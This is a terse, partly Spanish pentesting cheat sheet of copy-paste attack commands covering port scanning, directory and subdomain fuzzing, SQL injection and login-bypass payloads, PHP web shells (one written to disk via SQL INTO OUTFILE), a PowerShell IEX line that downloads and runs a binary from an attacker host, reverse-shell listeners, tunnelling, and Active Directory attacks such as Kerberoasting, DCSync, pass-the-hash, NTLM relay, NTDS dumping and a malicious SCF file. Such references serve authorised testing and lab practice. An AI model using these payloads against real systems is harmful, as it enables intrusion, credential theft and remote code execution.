# Cheatsheet
Cosas copypaste

# Red

TCP/SYN Scan
```
nmap -sCV -p- IP --min-rate 5000 -Pn -n --open -v -oN nmap.txt
```
UDP top 500 Scan
```
nmap -sU --top-ports 500 --open -T5 -v -n IP
```
SC/TP Scan
```
nmap -sCV -p- -sS --min-rate 5000 --open -vvv -n -Pn IP -sY
```
Host Discovery (ARP y DNS Resolution)
```
nmap -sn network/address
```
Host Discovery (ICMP scan)
```
wget https://raw.githubusercontent.com/CronoX1/Host-Discovery/main/Host-Discovery.py
```
Remote Port Tunneling
```
socat TCP-LISTEN:LISTENNING_PORT,fork sctp:REMOTE_IP:REMOTE_PORT
```
# Web

## Enumeracion
### Directory Listing & subdomain discovering

#### Wfuzz

Subdomaing Discovering

```
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.dominio.ext" url
```
Directory Listing

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://Domain-or-IP/FUZZ
```
#### Gobuster

Subdomaing Discovering

```
gobuster vhost -u url -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
Directory Listing

```
gobuster dir -e -u http://Domain-or-IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
## Reverse Shell

RCE PHP
```
<?php system($_GET[cmd]);?>
```

RCE .aspx
```
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
```

Shell PHP
```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

## SQL Injection

Database (BBDD, DB) enumeration (sustituir el numero correspondiente del último valor por 'database()' para saber el nombre de la BBDD)
```
UNION SELECT 1,2,...
```

### In-band or Error Based

Tables enumeration
```
UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'nombre_BBDD'; - --
```
Columns of table enumeration
```
UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'nombre_tabla'; - --
```
Table dumping
```
UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombre_tabla; - --
```
### Blind SQLI

#### Login Bypass

```
' or 1=1 - --
```
```
' or '1'='1'#
```
#### Boolean Based (poner siempre por defecto 'false')

Database enumeration brute force attack(sin sustituir ninguno de los numeros)
```
UNION SELECT 1,2,3 where database() like '%'; - --
```
Tables enumeration
```
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'BBDD' and table_name like '%';- --
```
Columns enumeration
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%'; - --
```
Columns enumeration una vez encontrada una columna
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%' and COLUMN_NAME !='nombre_tabla_encontrada'; - --
```
Table dumping
```
UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_columna like '%'; - --
```
#### Time Based

Injección 
```
UNION SELECT SLEEP(5),2,...; - --
```

### PHP Web Shell
```
select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
```

# Powershell

Descargar binarios
```
powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
```
# Bash

## Listeners

Paquetes ICMP
```
tcpdump -i NETINTERFACE icmp -n
```
Shell nc
```
nc -lvnp PORT
```
Shell chetado
```
rlwrap nc -lvnp PORT
```

# PostExplotacion

## Chisel

Atacante
```
./chisel server --reverse -p ATACKER_PORT
```

Víctima
```
./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
```

## Mejorar Shell

Linux
```
script /dev/null -c bash
```
```
stty raw -echo ;fg
```
```
reset xterm
```
```
export TERM=xterm
```
```
export SHELL=bash
```
# Active Directory (AD)

Kerbrute

```
kerbrute -users userlist.txt -dc-ip IP -domain domain.local
```
ASREPRoasting

```
GetNPUsers.py -dc-ip IP domain.local/user -outputfile hashes.asreproast
```
Kerberoastin

```
GetUserSPNs.py DC-IP\user:password
```
DRSUAPI (DCSync)

```
secretsdump.py domain.local/USER:PASSWORD@IP
```
Pass the hash

```
evil-winrm -i IP -u user -H 'NTHash'
```
```
psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
```
```
wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
```
SMB Relay

```
responder -I  NETINTERFACE -dw
```
NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without 'c' flag)]

```
ntlmrelayx.py -tf targets.txt -smb2support -c "command"
```
Domain Host Discovery

```
crackmapexec smb network/address
```
User & Password Spraying

```
crackmapexec smb network/address -u users -p passwords
```
NTDS dumping

```
crackmapexec smb network/address -u users -p passwords --ntds vss
```
Userenum with RPC (-N para Null Session)

```
rpcclient -U 'domain.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
```
Descripcion usuarios with RPC

```
for rid in $(rpcclient -U 'dominio.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'| tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n";  rpcclient -U 'dominio.local\user%password' IP -c "queryuser $rid" | grep -E -i "user name|description" ;done
```
ldapdomaindump

```
service apache2 start
```
```
ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
```
Malicious SCF File

```
[Shell]
Command=2
IconFile=\\IP\smbfolder\CronoX.ico
[Taskbar]
Command=ToggleDesktop
```
```
impacket-smbserver smbFolder $(pwd) -smb2support
```
